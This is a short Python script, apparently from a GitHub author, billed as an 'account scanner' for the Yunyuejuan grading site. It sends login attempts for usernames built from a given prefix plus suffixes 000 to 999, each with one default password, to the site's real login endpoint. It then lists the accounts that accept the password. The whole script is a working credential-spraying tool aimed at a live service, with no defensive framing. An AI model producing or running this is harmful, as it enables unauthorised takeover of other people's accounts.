import requests
import sys
import time

def is_success(username: str, defpasswd: str, num: int) -> bool:
    """Check if the account is accessible."""
    ret = requests.post("http://sc.yunyuejuan.net/SystemLogin", data = {
        "j_username": username + (3 - len(str(num))) * "0" + str(num),
        "j_password": defpasswd
    })

    if ret.text.find("不正确") >= 0 or ret.text.find("限制") >= 0:
        """Log in failed."""
        return False
    return True

def main():
    print("""Yunyuejuan account scanner
Auther: 31core
GitHub: https://github.com/31core
Website: https://31core.pythonanywhere.com
""")

    username = input("Username: ")
    defpasswd = input("Default password: ")

    print("Scanning...")
    for i in range(1000):
        sys.stdout.write("\r")
        sys.stdout.flush()
        t = time.time() #Timestamp before scan
        if is_success(username, defpasswd, i) == True:
            print(f"info: \"%s\" exist.\n"%(username + (3 - len(str(i))) * "0" + str(i)))
        sys.stdout.write(f"{i} of 999 ({round(time.time() - t, 2)} s per item)")
    print()
